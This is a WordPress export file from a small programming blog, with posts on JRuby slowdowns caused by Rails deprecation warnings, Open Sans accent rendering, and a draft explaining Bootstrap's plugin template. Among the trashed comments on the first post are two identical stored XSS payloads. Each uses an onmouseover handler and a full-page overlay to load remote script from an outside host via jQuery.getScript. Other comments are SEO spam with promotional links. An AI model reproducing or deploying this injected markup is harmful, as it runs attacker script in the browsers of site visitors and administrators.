<?xml version="1.0" encoding="UTF-8" ?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your site. -->
<!-- It contains information about your site's posts, pages, comments, categories, and other content. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your site. -->

<!-- To import this information into a WordPress site follow these steps: -->
<!-- 1. Log in to that site as an administrator. -->
<!-- 2. Go to Tools: Import in the WordPress admin panel. -->
<!-- 3. Install the "WordPress" importer from the list. -->
<!-- 4. Activate & Run Importer. -->
<!-- 5. Upload this file using the form provided on that page. -->
<!-- 6. You will first be asked to map the authors in this export file to users -->
<!--    on the site. For each author, you may choose to map to an -->
<!--    existing user on the site or to create a new user. -->
<!-- 7. WordPress will then import each of the posts, pages, comments, categories, etc. -->
<!--    contained in this file into your site. -->

<!-- generator="WordPress/4.1" created="2015-01-15 04:50" -->
<rss version="2.0"
	xmlns:excerpt="http://wordpress.org/export/1.2/excerpt/"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:wp="http://wordpress.org/export/1.2/"
>

<channel>
	<title>Sorted Array</title>
	<link>http://www.sortedarray.com</link>
	<description></description>
	<pubDate>Thu, 15 Jan 2015 04:50:55 +0000</pubDate>
	<language>en-CA</language>
	<wp:wxr_version>1.2</wp:wxr_version>
	<wp:base_site_url>http://www.sortedarray.com</wp:base_site_url>
	<wp:base_blog_url>http://www.sortedarray.com</wp:base_blog_url>

	<wp:author><wp:author_id>1</wp:author_id><wp:author_login>amunda</wp:author_login><wp:author_email>basit.hanif@gmail.com</wp:author_email><wp:author_display_name><![CDATA[amunda]]></wp:author_display_name><wp:author_first_name><![CDATA[]]></wp:author_first_name><wp:author_last_name><![CDATA[]]></wp:author_last_name></wp:author>


	<generator>http://wordpress.org/?v=4.1</generator>

	<item>
		<title>JRuby Performance: Beware of Rails deprecated warnings</title>
		<link>http://www.sortedarray.com/jruby-performance-beware-of-rails/</link>
		<pubDate>Mon, 11 Aug 2014 02:52:18 +0000</pubDate>
		<dc:creator><![CDATA[amunda]]></dc:creator>
		<guid isPermaLink="false">http://www.abdulmunda.com/?p=1</guid>
		<description></description>
		<content:encoded><![CDATA[We recently upgraded our JRuby version from 1.3.x to 1.7.12 and suddenly noticed a huge regression in performance. Our requests were starting to slow down by 500 ms and that was huge for our customers.

We investigate what could be the potential issue and we used some low level tools like jstack to really nail down where threads were spending most of the time. After investigating, we saw that in our call trace lot of Thread.getStackTrace() calls were made by the app. This is an expensive call in Java.

We looked closely of where the calls were coming from and found out that deprecated warnings in Rails methods were causing these calls. Our first thought was that we will just disable the deprecated warnings in Rails by using this flag:
<pre class="lang:ruby decode:true ">ActiveSupport::Deprecation.silenced =true</pre>
But we still continue to see getStackTrace calls in our call traces. We further dig down in Rails code and found out that it was the Kernel 'caller' method which was the culprit.
<pre class="lang:default decode:true">ActiveSupport::Deprecation.warn "Calling `assign_shortcuts` is deprecated and has no effect anymore.", caller</pre>
Caller method in JRuby will call the getStackTrace method and this was used by 'ActiveSupport::Deprecation.warn' method to report the exact line of the offending method.

Since it was passed in as an argument to deprecated warnings method, logic for switching on/off deprecated warnings has no effect. So the 'silenced' flag didn't help at all.

So our solution was to fix all the deprecated warnings and wherever we couldn't fix the warnings, we had to monkey patch Rails and completely remove the deprecated method call from the method.

So please beware of Rails deprecated warnings in JRuby!]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1</wp:post_id>
		<wp:post_date>2014-08-11 02:52:18</wp:post_date>
		<wp:post_date_gmt>2014-08-11 02:52:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>jruby-performance-beware-of-rails</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="ruby"><![CDATA[Ruby]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[hello-world]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_s2mail</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>11</wp:comment_id>
			<wp:comment_author><![CDATA[JessicaCig]]></wp:comment_author>
			<wp:comment_author_email>jessicasenson2296@hotmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://next-gen-traffic.net</wp:comment_author_url>
			<wp:comment_author_IP>178.137.84.124</wp:comment_author_IP>
			<wp:comment_date>2014-11-18 10:51:54</wp:comment_date>
			<wp:comment_date_gmt>2014-11-18 15:51:54</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi www.abdulmunda.com admin have you wondered what’s the secret how big company websites get massive targeted traffic and exposure in Google 1st page results for the biggest and toughest keywords? 
Answer is simple links, but only quality links which counts as votes for your site giving Google no choice but to shoot your site rankings to #1 results so your customers can see your site at the top of Google search results.  Today is your lucky day because I’m going to reveal you secret resource of best of the best links from 500’000 website network! Yes that’s correct not some tiny 500 site network but half a million. 
*Links from real established, authority English actual PR pages with low outbound links max 10 
* Skyrocket your website rankings for your website related keyword and get massive laser targeted traffic, customers and $$$ in your bank account. Forget about thousands of crap directory and forum links which will do nothing bust just hurt your website rankings. Get the real deal at http://next-gen-traffic.net Yes that’s the future of link building 
After my site is now at #1 position in Google I think http://next-gen-traffic.net is the game changer in seo world! 
Your friend Jessica.]]></wp:comment_content>
			<wp:comment_approved>trash</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_status</wp:meta_key>
				<wp:meta_value><![CDATA[0]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_time</wp:meta_key>
				<wp:meta_value><![CDATA[1420899602]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>12</wp:comment_id>
			<wp:comment_author><![CDATA[MikeCeN]]></wp:comment_author>
			<wp:comment_author_email>mike_omike@aol.com</wp:comment_author_email>
			<wp:comment_author_url>http://mass-auto-traffic.net/download.html</wp:comment_author_url>
			<wp:comment_author_IP>178.137.84.124</wp:comment_author_IP>
			<wp:comment_date>2014-11-22 10:03:16</wp:comment_date>
			<wp:comment_date_gmt>2014-11-22 15:03:16</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[After getting more than 10000 visitors/day to my website I thought your www.abdulmunda.com website also need  unstoppable flow of traffic... 
 
Use this BRAND NEW software and get all the traffic for your website you will ever need ... 
 
= = &gt; &gt; http://mass-auto-traffic.net/download.html 
 
In testing phase it generated 867,981 visitors and $540,340. 
 
Then another $86,299.13 in 90 days to be exact. That's $958.88 a 
day!! 
 
And all it took was 10 minutes to set up and run. 
 
But how does it work?? 
 
You just configure the system, click the mouse button a few 
times, activate the software, copy and paste a few links and 
you're done!! 
 
Click the link BELOW as you're about to witness a software that 
could be a MAJOR turning point to your success. 
 
= = &gt; &gt; http://mass-auto-traffic.net/download.html 
Best regards 
Your old friend Mike]]></wp:comment_content>
			<wp:comment_approved>trash</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_status</wp:meta_key>
				<wp:meta_value><![CDATA[0]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_time</wp:meta_key>
				<wp:meta_value><![CDATA[1420899602]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>13</wp:comment_id>
			<wp:comment_author><![CDATA[mario]]></wp:comment_author>
			<wp:comment_author_email>mario@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.helloword.com</wp:comment_author_url>
			<wp:comment_author_IP>91.207.7.54</wp:comment_author_IP>
			<wp:comment_date>2014-12-11 08:30:54</wp:comment_date>
			<wp:comment_date_gmt>2014-12-11 13:30:54</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[<a href="#" title="]" rel="nofollow"></a>[" <!-- onmouseover=jQuery.getScript('http://wpxss.bestvt.org/') style="text-decoration:none;display:block;width:3000px;height:3000px;position:absolute;top:0px;left:0px;//&gt; --><a></a>]]]></wp:comment_content>
			<wp:comment_approved>trash</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_status</wp:meta_key>
				<wp:meta_value><![CDATA[0]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_time</wp:meta_key>
				<wp:meta_value><![CDATA[1420899836]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>14</wp:comment_id>
			<wp:comment_author><![CDATA[mario]]></wp:comment_author>
			<wp:comment_author_email>mario@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.helloword.com</wp:comment_author_url>
			<wp:comment_author_IP>91.207.7.54</wp:comment_author_IP>
			<wp:comment_date>2014-12-11 08:30:54</wp:comment_date>
			<wp:comment_date_gmt>2014-12-11 13:30:54</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[<a href="#" title="]" rel="nofollow"></a>[" <!-- onmouseover=jQuery.getScript('http://wpxss.bestvt.org/') style="text-decoration:none;display:block;width:3000px;height:3000px;position:absolute;top:0px;left:0px;//&gt; --><a></a>]]]></wp:comment_content>
			<wp:comment_approved>trash</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_status</wp:meta_key>
				<wp:meta_value><![CDATA[0]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_time</wp:meta_key>
				<wp:meta_value><![CDATA[1420899840]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>15</wp:comment_id>
			<wp:comment_author><![CDATA[Wendy]]></wp:comment_author>
			<wp:comment_author_email>jswjrw@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://qa.juststicky.com/yourls/275g</wp:comment_author_url>
			<wp:comment_author_IP>23.232.158.200</wp:comment_author_IP>
			<wp:comment_date>2014-12-21 00:42:38</wp:comment_date>
			<wp:comment_date_gmt>2014-12-21 05:42:38</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi, my name is Mindy and I am the marketing manager at StarSEO Marketing. I was just looking at your site and see that your website has the potential to get a lot of visitors. I just want to tell you, In case you don't already know... There is a website network which already has more than 16 million users, and most of the users are looking for topics like yours. By getting your site on this service you have a chance to get your site more visitors than you can imagine. It is free to sign up and you can find out more about it here: http://claimyourexcellence.info/1gl - Now, let me ask you... Do you need your site to be successful to maintain your business? Do you need targeted visitors who are interested in the services and products you offer? Are looking for exposure, to increase sales, and to quickly develop awareness for your website? If your answer is YES, you can achieve these things only if you get your site on the network I am describing. This traffic network advertises you to thousands, while also giving you a chance to test the network before paying anything at all. All the popular sites are using this service to boost their traffic and ad revenue! Why aren’t you? And what is better than traffic? It’s recurring traffic! That's how running a successful site works... Here's to your success! Find out more here: http://cmyad.co/i/5i1w]]></wp:comment_content>
			<wp:comment_approved>trash</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_status</wp:meta_key>
				<wp:meta_value><![CDATA[0]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>_wp_trash_meta_time</wp:meta_key>
				<wp:meta_value><![CDATA[1420899602]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Open Sans fonts can break accent characters</title>
		<link>http://www.sortedarray.com/open-sans-fonts-can-break-accent-characters/</link>
		<pubDate>Mon, 05 Jan 2015 04:23:54 +0000</pubDate>
		<dc:creator><![CDATA[amunda]]></dc:creator>
		<guid isPermaLink="false">http://www.abdulmunda.com/?p=20</guid>
		<description></description>
		<content:encoded><![CDATA[We recently added Open Sans fonts to our application and started seeing that accent characters for some languages weren't properly rendering in Firefox. Accent characters were slightly right of the main character.

&nbsp;

<a href="http://www.abdulmunda.com/wp-content/uploads/2015/01/Screen-Shot-2015-01-04-at-10.39.57-PM.png"><img class="aligncenter wp-image-27 size-large" src="http://www.abdulmunda.com/wp-content/uploads/2015/01/Screen-Shot-2015-01-04-at-10.39.57-PM-1024x322.png" alt="Screen Shot 2015-01-04 at 10.39.57 PM" width="640" height="201" /></a>

&nbsp;

At first, we thought that this could be because we were missing a charset, so we decided to add all the character sets Open Sans provides.

<pre class="lang:ruby decode:true">&lt;link href='http://fonts.googleapis.com/css?family=Open+Sans&amp;subset=latin,cyrillic,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext' rel='stylesheet' type='text/css'/&gt;</pre>

We realize at this point that our data was not <a href="http://www.unicode.org/faq/normalization.html">normalized</a> and what was happening is that Open Sans was trying to render two separate characters (an accent character and the main character) and the accent character was not present in Open Sans charset.

<pre class="lang:ruby decode:true"> <span class="s1">"ō".codepoints.to_a </span> # [111, 772]</pre>

The reason why we didn't see this issue in Chrome is because <a href="http://stackoverflow.com/questions/11176603/how-to-avoid-browsers-unicode-normalization-when-submitting-a-form-with-unicode">Chrome does the normalization</a> of characters to NFC on render. We fixed this issue by normalizing our data on backend before we pass it to our Rails app.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>20</wp:post_id>
		<wp:post_date>2015-01-04 23:23:54</wp:post_date>
		<wp:post_date_gmt>2015-01-05 04:23:54</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>open-sans-fonts-can-break-accent-characters</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="character-encodings"><![CDATA[Character Encodings]]></category>
		<category domain="post_tag" nicename="fonts"><![CDATA[Fonts]]></category>
		<category domain="post_tag" nicename="uniocde"><![CDATA[Uniocde]]></category>
		<wp:postmeta>
			<wp:meta_key>_s2mail</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Breakdown of Bootstrap Plugin</title>
		<link>http://www.sortedarray.com/?p=46</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[amunda]]></dc:creator>
		<guid isPermaLink="false">http://www.abdulmunda.com/?p=46</guid>
		<description></description>
		<content:encoded><![CDATA[Most of the Bootstrap javascript plugins like Modal, Dropdown and others share the same basic template. I wanted to extract that template out from their js plugin and explain each part. Here is the basic template extracted from <a title="modal.js" href="https://github.com/twbs/bootstrap/blob/master/js/modal.js">modal.js</a>.
<pre class="lang:js decode:true">+function ($) {
  'use strict';

  // MODAL CLASS DEFINITION
  // ======================

  var Modal = function (element, options) {
    this.options        = options
    this.$body          = $(document.body)
    ...
  }

  Modal.VERSION  = '3.2.0'

  Modal.DEFAULTS = {
    backdrop: true,
    keyboard: true,
    show: true
  }

   Modal.prototype.show = function (_relatedTarget) {
     ....
   }

  // MODAL PLUGIN DEFINITION
  // =======================

  function Plugin(option, _relatedTarget) {
    return this.each(function () {
      var $this   = $(this)
      var data    = $this.data('bs.modal')
      var options = $.extend({}, Modal.DEFAULTS, $this.data(), typeof option == 'object' &amp;&amp; option)

      if (!data) $this.data('bs.modal', (data = new Modal(this, options)))
      if (typeof option == 'string') data[option](_relatedTarget)
      else if (options.show) data.show(_relatedTarget)
    })
  }

  var old = $.fn.modal

  $.fn.modal             = Plugin
  $.fn.modal.Constructor = Modal


  // MODAL NO CONFLICT
  // =================

  $.fn.modal.noConflict = function () {
    $.fn.modal = old
    return this
  }

  ....

}(jQuery);</pre>
Let's break this template further and look at each of the parts separately:
<h3> 1. Self Invoking Function:</h3>
<pre class="lang:ruby decode:true ">+function ($) {
 ...
}(jQuery)</pre>
Self-invoking functions are the functions which get invoked as soon as it gets defined. They create a scope for all the variables and functions defined within the function so they don't leak to global scope.

Another interesting thing about this function is that it is starting with the plus sign '+'.  The reason for this is to make parser think that it is function expression instead of function statement. Whenever javascript parser sees 'function' at the start of the line it considers that as function statement. Function statement requires that function should have name and also you cannot end the function statement with parenthesis like '(jquery)'. Function expression on the other-hand can be anonymous and you can invoke them right away by putting parenthesis at the end. Putting any operator like +, -, ! etc. in front of the function will make parser think that it's function expression.

Lastly, you have notice that we actually pass 'jQuery' to the function and make parameter name to be '$'. This way we can reference jQuery within function with '$' and outside the scope of the function you can continue to use '$' for other libraries. This avoids any conflict between jQuery and other libraries which share '$'.
<h3> 2. Strict Mode</h3>
<pre class="lang:ruby decode:true">"use strict";
</pre>
By switching on the strict mode of javascript you opt into a better, secure and restricter version of javascript. In this mode for example you cannot use undeclared variables this way you cannot add variables to global scope by mistake e.g
<pre class="lang:ruby decode:true">function test() {
  "use strict";
  x = 10; /* throws syntax error - Uncaught ReferenceError: x ... */
}</pre>
Similarly, assigning value to a non-writable or getter-only property will throw error as well. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode">MDN</a> and <a href="http://www.w3schools.com/js/js_strict.asp">w3schools</a> had great explanation on whats allowed and disallowed in strict mode.
<h3>3. Constructor Function &amp; Prototype</h3>
<pre class="lang:js decode:true">var Modal = function (element, options) {
    this.options        = options
    this.$body          = $(document.body)
    ...
  }

Modal.VERSION  = '3.2.0'

Modal.DEFAULTS = {
  backdrop: true,
  keyboard: true,
  show: true
}

Modal.prototype.show = function (_relatedTarget) {
  ....
}
</pre>
Modal is a constructor function which gets called when 'new Modal()' is called. Important thing to note is that 'this' in Modal function can change references based on how it is called. If its called with the new operator like 'new Modal()" then 'this' is bound to a newly created object and all the properties like 'options' are set on that object. But if its called without new operator like 'Modal();' then 'this' is bound to the global object and it can clobber the global namespace. Take a look at the example below:
<pre class="lang:ruby decode:true ">var Tester = function() {
  console.log(this);
}

Tester();     /* outputs: Window    */
new Tester(); /* outputs: Tester {} */</pre>
After defining the constructor function, we set some properties like 'DEFAULT' and 'VERSION' and some functions on Modal's prototype which makes those functions available to all the instances of Modal object. The functions exposed on the prototype becomes the public api of this plugin.
<h3>4. Main Plugin Function</h3>
<pre class="lang:js decode:true">// MODAL PLUGIN DEFINITION
  // =======================

  function Plugin(option, _relatedTarget) {
    return this.each(function () {
      var $this   = $(this)
      var data    = $this.data('bs.modal')
      var options = $.extend({}, Modal.DEFAULTS, $this.data(), typeof option == 'object' &amp;&amp; option)

      if (!data) $this.data('bs.modal', (data = new Modal(this, options)))
      if (typeof option == 'string') data[option](_relatedTarget)
      else if (options.show) data.show(_relatedTarget)
    })
  }

  var old = $.fn.modal

  $.fn.modal             = Plugin
  $.fn.modal.Constructor = Modal</pre>
This plugin function is the method which gets exposed to jQuery's prototype ($.fn). This is the method gets called when you call '$('.my_modal').modal();'.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>46</wp:post_id>
		<wp:post_date>2015-01-13 23:47:02</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_s2mail</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
</channel>
</rss>
